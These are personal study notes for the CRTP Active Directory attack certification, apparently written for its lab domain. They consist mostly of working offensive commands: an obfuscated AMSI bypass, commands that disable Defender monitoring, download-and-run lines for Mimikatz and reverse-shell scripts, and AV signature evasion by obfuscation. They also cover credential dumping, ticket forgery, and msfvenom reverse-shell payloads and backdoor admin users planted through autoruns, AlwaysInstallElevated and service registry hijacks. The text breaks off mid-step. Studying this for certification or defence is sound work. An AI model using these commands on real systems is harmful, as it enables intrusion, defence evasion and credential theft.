# CRTP One Week Challenge
#Main Notes
### Things to keep in mind during the exam
```
#Learing Objective 1
Enumerate Users
Enumerate Computers
Enumerate Domain Administrator
Enumerate Enterprise Administrator

#Learing Objective 2
List all the OUs
List all the computers in the StudentMachines OU
List the GPOs
Enumerate GPO applied on the StudentMachines OU

#Learing Objective 3
Enumerate ACL for the Domain Admins group
Enumerate all modified rights/permissions for the students

#Learing Objective 4
Enumerate all domains in the moneycorp.lcoal forest
Map the trusts of the dollarcorp.moneycorp.lcoal domain
Map external trusts in moneycorp.localforest
Identify external trusts of dollarcorp domain

#Learing Objective 5
elevate privilege to local administrator
Identify a machine in the domain where you have local administrative access
Using privileges of a user get DC

#Learing Objective 6
use BloodHound to identify the shortest path to Domain Admins in the dollarcorp admin
```
### Load InviShell to avoid any enhanced login locally
```
C:/AD/Tools/InviShell/RunWithRegistryNonAdmin.bat
```

### Bypass AMSI
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
### Bypass Real-Time Monitoring
```
Powershell Set-MpPreference -DisableRealtimeMonitoring $true
Powershell Set-MpPreference -DisableIOAVProtection $true
PowerShell set-MpPreference -DisableAutoExclusions $true
```
### Bypass Script Block login
```
iex (iwr http://10.0.10.16/sbloggingbypass.txt-UseBasicParsing)
```
### Load Script in memory to bypass Windows Defender
```
iex (iwr http://172.16.100.7:9090/PowerView.ps1 -UseBasicParsing)
iex (iwr http://172.16.100.7:9090/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

### RevShell using PowerShellTcp.ps1 & getting a shell using powercat in powershell
```
powershell.exe iex (iwr http://172.16.100.7:9090/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.7 -Port 889
powercat -l -v -p 889 -Timeout 100
```

# PowerShell

Bypassing PowerShell Security using Invisi-Shell  (https://github.com/OmerYa/Invisi-Shell)
```
RunWithPathAsAdmin.bat  (Admin Privilege)
RunWithRegistryNonAdmin.bat  (non-Admin Privilege)
```

Load a script and module (local)
```
. C:\AD\Tools\PowerView.ps1
OR
Import-Module C:\AD\Tools\PowerView.ps1
```

list all the commands u can use in a particular module
```
Get-Command -Module <modulename>
```

Download PowerShell Script
```
iex ((New-Object Net.WebClient).DownloadString('http://10.10.10.6/PowerView.ps1')
```

Load a script and module (remotely)
```
ine (New-Object Net.WebClient).DownloadString('http://10.10.16.10/payload.ps1')
```
Bypassing AV Signatures for PowerShell
.      Invoke-Mimi & Invoke-MimiEx are the obfuscated tools of Invoke-Mimikatz
.      if u r going to run a PowerShell script from the disk it may get detected; u can use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected
.      Scan using AMSITrigger 'AmsiTrigger_x64.exe -i PowerUp.ps1' | Modify the detected code by reversing ex. 'System.AppDomain' to 'niamoDppA.metsyS' | Rescan using AMSITrigger | Repeat the steps till u get a result as "AMSI_RESULT_NOT_DETECTED"
.      u can use DefenderCheck (https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary / file that Windows Defender may flag
.      simply provide path to the script file to scan it
-     AmsiTrigger_x64.exe -i C:\AD\Tools\Invok-PowerShellTcp_Detected.ps1 DefenderCheck.exe PowerUp.ps1
.      for full obfuscation of PowerShell scripts use Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)
example of minimal obfuscation; if u run powerup.ps1 and the following line got detected "New-Object System.Net.Sockets.TCPClient($IP,$PORT)"
## Reverse the "Net.Sockets" string on line number 32
```
$string = "stekcoS.teN"
$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
if ($Reverse)
{
$client = New-Object System.$class.TCPClient($IPAddress,$PORT)
}
```

# Methodology Master
---
## 0. Miscellaneous
> 1. [ ] Remember to bypass AMSI on every new user
> 2. [ ] Check the Execution policy language mode
> 3. [ ] Check all the commands you are allowed to execute

## 1. Domain Enumeration
> 1. [ ] Complete basic Enum
> 2. [ ] enumerate all users
> 3. [ ] enumerate all domain computers
> 4. [ ] GPO && OU
> 5. [ ] ACL's 
> 6. [ ] Trusts
> 7. [ ] Blood-hound
> 8. [ ] SPN

## 2. Local Priv Esc
> 1. [ ] Run *powerups.ps1*
> 2. [ ] **ServiceUnquoted**
> 3. [ ] **ModifiableServiceFile**
> 4. [ ] **ModifiableService**
> 5. [ ] Priv Esc for the above use : **Invoke-ServiceAbuse**
> 6. [ ] **whoami /all** || **whoami /priv**
> 7. [ ] Check Windows abuse and priv esc
> 8. [ ] Hunt for Local Admin users if available from Trust Enum
> 9. [ ] Priv Esc for the above use : PSsession or refer **Invoke-Command**
> 10. [ ] Check if you can Priv esc using *jenkins*
> 11. [ ] Lastly add the user to the localgroup administrators

**NOTE : ONCE A LOCAL ADMINISTRATOR RUN PS as ADMINISTRATOR**

## 3. Domain Admin Priv Esc
> 1. [ ] Hunt for Local Admin Users
> 2. [ ] Check The local Admin Access
> 3. [ ] If yes, Use **Invoke-Command** or **Enter-PSSession**

## 4. Domain Admin Persistence [app locker enabled]
> 1. [ ] Check the Execution policy language mode
> 2. [ ] Checking AppLockerPolicy and note the paths available for us
> 3. [ ] Disable Defender protections
> 4. [ ] Modify Invoke-Mimikatz.ps1 script to call the function in the script itself because we can't dot source files if in constrained language mode
> 5. [ ] run script without dot sourcing it
> 6. [ ] Dump the hashes
> 7. [ ] Get the ekeys
> 8. [ ] Get Credentials from the credentials vault

## 5. Domain Admin Persistence
> 1. [ ] Dump the hashes us the user using *Invoke-Mimikatz*
> 2. [ ] Get the ekeys
> 3. [ ] Get Credentials from the credentials vault
> 4. [ ] Using *Over-Pass-the-Hash Attack* spawn a PowerShell session as that user

## 6. New user from DA Priv Esc
> 1. [ ] Follow the same exact steps from **3. to 5.** if a new user is found

## 7. DC pwn
> 1. [ ] After we get a DA user with Administrator access we can connect to the DC using **Enter-PSSession -ComputerName dcorp-dc**

## 8. Domain Controller Persistence
> 1. [ ] Golden Ticket
> 2. [ ] Silver Ticket
> 3. [ ] DSRM
> 4. [ ] ACL AdminSDHolder
> 5. [ ] ACL DCSync
> 6. [ ] ACL security Descriptors

## 9. Forest Priv Esc

> 1. [ ] Forge inter-forest ticket by trust keys

---

# Domain Enumeration - Basic
Enumerate following for the dollarcorp domain:
> 1. [ ] Users
```
Get-DomainUser	#check the name at the end
Get-DomainUser | select -ExpandProperty samaccountname #list a specific property of all the users
```
> 2. [ ] Computers
```
Get-DomainComputer | select -ExpandProperty dnshostname #list computers
```
> 3. [ ] Domain Administrators
```
Get-DomainGroup | select name #list domain admin group name
Get-DomainGroup -Identity "Domain Admins" #details of the domain admins
Get-DomainGroupMember -Identity "Domain Admins" #enumerate members of the domain admins group. check MemberName & MemberSID
```
> 4. [ ] Enterprise Administrators
```
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local #enumerate enterprise admin. you can get the domain name from computer enum
```
- run Invisi-Shell then PowerView before Domain Enumeration (bypassing AMSI & loading PowerView)
```
RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
```
Get current domain
```
Get-NetDomain  #check name, Forest, DomainControllers, Children, Parent...
```
Get object of another domain
```
Get-NetDomain -Domain moneycorp.local
```
Get domain SID for the current domain  (security identifier)
```
Get-DomainSID  #will be used in other attacks
```
Get domain policy for the current domain
```
Get-DomainPolicy  
(Get-DomainPolicy)."Kerberos Policy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."System Access" #Password policy
(Get-DomainPolicy).PrivilegeRights #Check your privileges
```
Get domain policy for another domain
```
(Get-DomainPolicy -domain moneycorp.local)."system access"
(Get-DomainPolicy -domain moneycorp.local)."kerberos policy"
(Get-DomainPolicy -domain moneycorp.local)."Privilege Rights"
```
Get domain controllers for the current domain
```
Get-NetDomainController #check name
```
Get domain controllers for another domain
```
Get-NetDomainController -Domain moneycorp.local  #check name
```
Get a list of all users in the current domain
```
Get-DomainUser  #list all users
Get-DomainUser -Identity student1  OR Get-DomainUser -Username student1  #select the information only for student1
Get-DomainUser -Identity student1 -Properties *  //maybe only for AD module u need to check
Get-DomainUser | select samaccountname,logonCount  #Get specific property of all users
Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description
```
Get list of all properties for users in the current domain
```
Get-UserProperty
Get-UserProperty -Properties pwdlastset,logoncount,badpwdcount
Get-UserProperty -Properties logoncount  #if the user has a low number of logons. user can be a decoy
Get-UserProperty -Properties badpwdcount
```
search for a particular string in a user's attributes (Description)
```
Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description
Find-UserField -SearchField Description -SearchTerm "built"
```
Get a list of computers in the current domain
```
Get-DomainComputer  #get all computers
Get-DomainComputer | select cn,logonCount
Get-DomainComputer -OperatingSystem "*Server 2016*"
Get-DomainComputer -Ping  #check if the machine is alive or not. if firewall is on this may give u a false positive
Get-DomainComputer -FullData  #list of all data including SID
```
Get all the groups in the current domain
Enterprise admin group  won't be listed cause it's at the root of the forest
```
Get-DomainGroup | select name
Get-DomainGroup -Domain <targetdomain> | select cn
Get-DomainGroup -FullData
Get-NetComputer -Domain
```
Get all groups containing the word "admin" in group name
Enterprise admin group  won't be listed cause it's at the root of the forest
```
Get-DomainGroup *admin*
Get-DomainGroup -GroupName *admin*  #all groups with admin name (excluding the root of the forest)
Get-DomainGroup -GroupName *admin* -Doamin moneycorp.local  #check the forest root (this will return enterprise admin group)
Get-DomainGroup *Domain Admins* -FullData  #get full data of the domain admin group
```
Get all the members of the Domain Admins group
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse  # check the name & always check the RID in SID if it is 500; if yes means the user is admin
Get-DomainGroup -GroupName 'Enterprise Admins' -Domain moneycorp.local (we added the domain to check the root as well)
Get-DomainGroup -GroupName 'Administrators'  #check the MemberName & IsGroup; if IsGroup is false means this is a user
Get-DomainGroupMember -GroupName 'Administrators' -Recurse  #Enum the membership of a group from the above command
```
Get the group membership for a user
opposite to the above command
```
Get-DomainGroup -UserName "student1" | select name
```
List all the local groups on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroup -computerName dcorp-dc
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local  #membership of the groups on the domain controller
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups  #list groups on the domain controller
```
Get members of all the local groups on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
```
Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
```
Get actively logged users on a computer (needs local admin rights on the target)
```
Get-NetLoggedon -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
```
Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
```
Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
```
Get the last logged user on a computer (needs administrative rights and remote registry on the target)
```
Get-LastLoggedon -ComputerName <servername>
```
Find shares on hosts in the current domain.
```
Invoke-ShareFinder -Verbose
Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC  #Exclude common or default shares
```
Find sensitive files on computers in the domain
```
Invoke-FileFinder -Verbose
```
Get all fileservers of the domain
```
Get-NetFileServer -Verbose
```
Enumerate Enterprise Administrators
```
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

---

# Domain Enumeration - Group Policy Object Enumeration
Enumerate the following for the dollarcorp domain:
> 1. [ ] List all the OUs
```
Get-DomainOU #check the name in the output
Get-DomainOU | select -ExpandProperty name #see only the names
```
> 2. [ ] List all the computers in the StudentMachines OU
```
(Get-DomainOU -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
> 3. [ ] List the GPOs
```
Get-DomainGPO
```
> 4. [ ] Enumerate GPO applied on the StudentMachines OU
```
Get-DomainGPO -Identity "{AB306569-220D-43FF-BO3B-83E8F4EF8081}"
```
Get list of GPO in current domain.
```
Get-DomainGPO | select displayname  #display all policies
Get-DomainGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.local  #check if any of the GPO applied on particular machine. check displayname ex. students policy is applied on the machine
```
List all the computer in the StudentMachines OU
```
(Get-Domain -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
Get GPO(s) which use Restricted Groups or groups.xml for interesting users
```
Get-DomainGPOLocalGroup
```
Get users who are in a local group of a machine using GPO
```
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcop-student1
```
Get machines where the given user is member of a specific group
```
Get-DomainGPOUserLocalGroupMapping -Identity student -Verbose
```
Get OUs in a domain
```
Get-DomainOU -FullData  #list of organizational unit in the domain
```
Get GPO applied on an OU. Read GPOName from gplink attribute from Get-NetOU
```
Get-DomainGPO -Identity "{AB306569-220D-43FF-BO3B-83E8F4EF8081}"  #group policy that is applied on the OU. check displayname ex. group policy student is applied
```

# Domain Enumeration - Access Control List Enumeration  (better to use bloodhound)
ACL is a list of Access Control Entries (ACE) - ACE corresponds to individual permission or audits. who has permission and what can be done
- DACL - Defines the permissions trustees.
- SACL - Logs success and failure audit messages when an object is accessed.
> 1. [ ] ACL for the Domain Admins group
```
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose #check ObjectAceType
```
> 2. [ ] Check all modify rights/permissions for the studentx
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"}
```
> 3. [ ] Check modify rights/permissions for the studentx in RDPUsers group as user is a member of it
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
Get the ACLs associated with the specified object (groups)
```
Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs  #get a list of Aces from student1. check ObjectDN, IdentityReference, ActiveDirectoryRights
```
Get the ACLs associated with the specified prefix to be used for search
```
Get-DomainObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose
```
We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs
won't work in PowerView
```
(Get-Acl "AD:\CN=Administrator, CN=Users, DC=dollarcorp, DC=moneycorp,DC=local").Access
```
Get the ACLs associated with the specified LDAP path to be used for search
```
Get-DomainObjectAcl -SearchBase 'LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local' -ResolveGUIDs -Verbose
```
Search for interesting ACEs
```
Find-InterestingDomainAcl -ResolveGUIDs
```
Get the ACLs associated with the specified path
```
Get-PathAcl -Path "\\dc.mydomain.local\sysvol" 
```
---

# Domain Enumeration - Trusts Enumeration

> 1. [ ] Enumerate all domains in the moneycorp.local forest
```
Get-ForestDomain -Verbose #enumerate all domains in the current forest. check name
```
> 2. [ ] Map the trusts of the dollarcorp.moneycorp.local domain
```
Get-DomainTrust #check SourceName, TargetName, TrustsAttributes, and TrustDirection
```
> 3. [ ] Map External trusts in meneycorp.local forest
```
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"} #check TrustAttributes
``` 
> 4. [ ] Identify external trusts of dollarcorp domain. can you enumerate trusts for a trusting forest?
```
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"} #check TrustAttribut
```
> 5. [ ] Enumerate trusts for eurocop.local forest
```
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```
Get a list of all domain trusts for the current domain
```
Get-DomainTrust  #check trust relationship
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local  #check the trust for different domain
```
Get details about the current forest
```
Get-Forest  #get the details about forest. check domains, GlobalCatalogs
Get-Forest -Forest eurocorp.local  #get the details about different forest. check domains, GlobalCatalogs
```
Get all domains in the current forest
```
Get-ForestDomain  #list of domains in the current forest
Get-ForestDomain -Forest eurocorp.local  #list of domains in different forest
```
Get all global catalogs for the current forest
```
Get-ForestGlobalCatalog  #check global catalogs of the current forest
Get-ForestGlobalCatalog -Forest eurocorp.local  #check global catalogs of different forest
```
Map trusts of a forest
```
Get-ForestTrust  #if u get nothing means there is no forest relationship trust in the current forest
Get-ForestTrust -Forest eurocorp.local  #check the forest relationship trust for external forest 
```
Map External trusts in meneycorp.local forest
```
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

---

# User Hunting
Find all machines on the current domain where the current user has local admin access (admin access in another machine)
```
Find-LocalAdminAccess -Verbose
```
Find computers where a domain admin (or specified user/group) has sessions
```
powershell -ep bypass   #If u get an error module can't be loaded
. C:\AD\Tools\Invoke-SessionHunter.ps1
Invoke-SessionHunter
OR
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
```
To confirm admin access in another local computer if yes you can run commands
```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
#OR
Invoke-UserHunter -CheckAccess   #check if you have admin access on another computer
```
Find computers where a domain admin is logged in
```
Invoke-UserHunter -Stealth  #Will only go to the high-value targets
```
Get users with privileges in other domains inside the forest
```
Get-DomainForeingUser 
```
Get groups with privileges in other domains inside the forest
```
Get-DomainForeignGroupMember 
```

---

# Active Directory - Local Privilege Escalation
> 1. [ ] Autorun
> 2. [ ] AlwaysInstallElevated
> 3. [ ] Service Registry
> 4. [ ] Executable Files
> 5. [ ] Startup Applications
> 6. [ ] DLL Hijacking
> 7. [ ] BinPath
> 8. [ ] Unquoted Service Paths
> 9. [ ] Juicy potato attack
> 10. [ ] Hot Potato attack
> 11. [ ] Kernel Exploits
> 12. [ ] Password Mining Escalation - Firefox
> 13. [ ] Backup
> 14. [ ] Runas-Savdcreds
> 15. [ ] Backup Operators (Disk shadow + Robocopy)
> 16. [ ] Abusing GPO permissions
> 17. [ ] Export LAPS Passwords
Windows Enumeration:
- system enum
```
systeminfo
check the patches (HotFixes) --> wmic qfe
list the drives ex. C: D: --> wimc logicaldisk
list the drives ex. C: D: --> wmic logicaldisk get caption,description,providername
gather information about a file --> get-content file.lnk
```
- user enum and groups
```
user that you are logged in with --> whoami
check user privilege --> whoami /priv
check the group that you are belonging to --> whoami /groups
check users in admin group --> net localgroup Administrator
show all users on the machine --> net user
gather info about X user --> net user <username>
check all users in X group --> localgroup <groupname>
```
- network enum
```
ipconfig /all
check all IPs that are connected to the machine --> arp -a
check what other machines are communicating to the machine (Possible to Pivoting) --> route print
check open ports on the machine (Possible to port forwarding) --> netstat -ano
```
- password hunting (passwords are in files). make sure in which directory you are then run the command. you also can run the command in the root directory
-     findstr /si password *.txt *.ini *.config
- firewall & Antivirus
 ```
find info about particular services like windefend --> sc query windefend
list all running services on the machine --> sc queryex type= service
check firewall settings --> netsh firewall show state OR netsh advfirewall firewall dump
```
- Windows-exploit-suggester usage:
  1- run 'systeminfo' and save it into a <sysinfo.txt>
  2- download and extract the tool from Git Hub.
  3- install pip if you don't have it --> curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py && pip install xlrd --upgarde
  4- Update the database --> ./windows-exploit-suggester.py --update
  5- ./windows-exploit-suggester.py --database <updatedDB.xls> --systeminfo <sysinfo.txt>
  
- Stored Passwords
- check the registry. you may find a default password
-     reg query HKLM /f password /t REG_SZ /s
- if you find any default password run the following
-     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
- if SSH is running on the system use the found credentials to login

**keep in mind to check the permissions in windows like icacls, icacls root.txt /grant <username>:F (this will grant full access to a file)**
transferring a file in windows using pyftpdlib
-     python -m pyftpdlib 21 (attacker machine)
-     ftp 10.0.2.10
Add a user
-     net user raman to0or /add

### After running powerup always check AbuseFuncion
For example you got the following
```
AbuseFuncion : Invoke-ServiceAbuse -Name '<ServiceName>'
```
use help with example to check the example
```
help Invoke-ServiceAbuse -Examples
Invoke-ServiceAbuse -Name "AbyssWebServer" -UserName "dcorp\student407"
```

you can use the below tools for complete coverage
- PowerUp   https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- Privesc   https://github.com/enjoiz/Privesc
- winPEAS   https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS

# <span style="color:lightblue">Autorun</span>

## <span style="color:lightgreen">Methodology</span>

Some programs are determined by the system administrator to run as soon as the system starts, so we assume that if we have a program we can modify it so that we add our own malicious file in place of the program. The first time the system is restarted, the first user to log in to the system will run the malicious file according to its authority.

### Using Autoruns and AccessChk
1. Transfer [Autoruns64.exe]([https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)) on the Windows/AD machine and execute it on cmd
```console
C:\Temp> Autoruns64.exe
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/91e45f42-3bf4-4503-a88d-b5ec77207f3b)
2. In Autoruns, click on the `"Logon"` tab.

3. From the listed results, notice that the `"My Program"` entry is pointing to `"C:\Program Files\Autorun Program\program.exe"`.
   
4. Go back to the command prompt run [AccessChk64.exe]([https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk))
```console
C:\Temp> accesschk64.exe -wvu "C:\Program Files\Autorun Program"

# Switch meaning
# w --> only show items that have write access
# v --> verbose; dispaly as many details as possible
# u --> ignore the errors
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2e31e838-22b0-4aa4-be5f-02dd129b0630) in Everyone we have `"FILE_ALL_ACCESS"`

### Using cmd
```
req query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
### Using winPEAS (recommended)
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/1f67ed07-25c9-49c1-9572-941443e2fa2c)

From the output, notice that the `"Everyone"` user group has `"AllAccess"` permission on the `"program.exe"` file. To gain administrator access, we can drop our malicious executable file by overwriting the file.
1. confirm the AllAccess privilege that we got form winPEAS by running accesschk.exe
```
accesschk.exe /accepteula -wvu <user> "C:\Program Files\Autorun Program\program.exe"
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/b9c86c44-bf07-4604-b798-38a5c5ae5d00)


### Using PowerUp
1. Run [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) and Run `Invoke-AllChecks` (check the autoruns field)

```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3c45bf70-456b-40c0-9d3c-e27616c73b78)


From the output, notice that the `"Everyone"` user group has `"FILE_ALL_ACCESS"` permission on the `"program.exe"` file. To gain administrator access, we can drop our malicious executable file by overwriting on the file.

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o program.exe
```
3. Transfer the generated file, `program.exe`, to the Windows VM.

### Windows VM

1. replace `program.exe` in `'C:\Program Files\Autorun Program'`

### Kali VM

1. Wait for a reverse shell on your kali machine.

# <span style="color:lightblue">AlwaysInstallElevated</span>

## <span style="color:lightgreen">Methodology</span>

# AlwaysInstallElevated  is a type of Registry Escalation.

run powerup and check if the AlwaysInstallElevated is there or not. if yes you can run the command that is in the powerup to add a new user to the administrator group (it will generate a program to add the user)

check AlwaysInstallElevated from the cmd. if the AlwaysInstallElevated has a value of 0x1 means it's on
```console
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```
 then run the program that powerup generated to create a backdoor user and set the user to the administrator group
another option is to use meterpreter to elevate your session
-     exploit/windows/local/always_install_elevated

## <span style="color:lightgreen">Detection</span>
### Windows VM

1. Open command prompt and type: 
```console
C:\Temp> reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```
+ `0x1` means its ON
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/7f8ab42c-77c2-4e52-b0d7-06fdf5ccd1fd)


2. In command prompt type: 
```console
C:\Temp>reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```
+ `0x1` means its ON
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/636ded17-c70b-4b17-9db0-f4882108d54a)


From the both output, we notice that `“AlwaysInstallElevated”` value is `1`. Hence, we can abuse this function to get privilege escalation.

### Using PowerUp

1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the AlwaysInstallElevated field)
```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/5d2380a0-2ecd-4bc2-a73c-fd5d44d9d762)


2. Run `Write-UserAddMSI` and Add backdoor user in *Administrators* group (Required RDP access)

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/53dd5cb6-8e32-49e8-9f33-9c84f883018d)


3. Check local Administrators
```console
C:\Temp> net localgroup administrators
# now backdoor is added to the localgroup administrators group
```

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```
2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f msi -o setup.msi
```
3. Copy the generated file, `setup.msi`, to the Windows VM.

### Windows VM

1. Place `'setup.msi'` in `'C:\Temp'`
2. Open command prompt and type: 
```console
C:\Temp> msiexec /quiet /qn /i C:\Temp\setup.msi
```

### Kali VM

1. Wait for a reverse shell on your kali machine.


# <span style="color:lightblue">Service Registry</span>

## <span style="color:lightgreen">Methodology</span>
A service registry consists of a cluster of servers that use a replication protocol to maintain consistency. Hence if we get Full Contol permission over the registry key, we can drop our malicious executable file to gain administrator access. 

## <span style="color:lightgreen">Detection</span>

### Using winPEAS
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/61c219fe-678e-48bd-91ae-aff0e82c866e)

winPEAS tells us regsvc service can be modified

1. use accesschk to confirm if you can modify the service
```
accesschk.exe /accepteula -kwv HKLM\system\currentcontrolset\services\regsvc
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/22536b55-2113-4686-a183-9e7f2801296a)

2. make sure that you can stop & start the service
```
accesschk.exe /accepteula -cv regsvc
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/de27514b-e6c1-4174-8ef2-7ffeac8ab9f6)

### Manual Detection

1. Open powershell prompt and type: 
```powershell
C:\Temp> powershell -ep bypass
PS C:\Temp> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/5cd1c41a-e02b-4645-a846-4964f6cc6c53)


2. Notice that the output suggests that user belong to `"NT AUTHORITY\INTERACTIVE"` has `"FullContol"` permission over the registry key.

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o x.exe
```
3. Copy the generated file `x.exe`, to the Windows VM.

### Windows VM

1. Place `x.exe` in `'C:\Temp'`
2. Open command prompt at type: 
```console
C:\Temp> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```
3. In the command prompt type: 
```console
C:\Temp> sc start regsvc
# If it doesnt work try restaring the service and perform the exploit egain
```

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/80be99bc-4576-4ddb-a3d2-a2880c33864b)


### Kali VM

1. Wait for a reverse shell on your kali machine.

### Another approach using windows_service.c file

1. Transfer the file from Windows to Kali. Use an FTP server to do that
-     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (run it on kali)
2. head to C:\Tools\Source and connect to the kali FTP server, anonymous login, then put the windows_service.c file
-     ftp 10.10.16.4 | username:anonymous | put windows_service.c
edit the windows_service file and replace the system("whoami > ..") with system("cmd.exe /k net localgroup administrator user /add"). 
3. compile the C file
-     w64-mingw32-gcc windows_service.c -o raman.exe     (sudo apt install gcc-mingw-w64)
4. move the compiled c file to Windows then run it using
-     reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc  /v ImagePath /t REG_EXPAND_SZ /d c:\temp\raman.exe /f
-     sc start regsvc
5. net localgroup administrator

### you can use the above approach by generating a reverse shell instead of adding a user
1. Transfer the file from Windows to Kali. Use an FTP server to do that
-     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (run it on kali)
2. head to C:\Tools\Source and connect to the kali FTP server, anonymous login, then put the windows_service.c file
-     ftp 10.10.16.4 | username:anonymous | put windows_service.c
3. edit the windows_service file and replace the system("whoami > ..") with system("nc.exe -e cmd.exe <Attacker_IP> <PORT>").
4. compile the C file
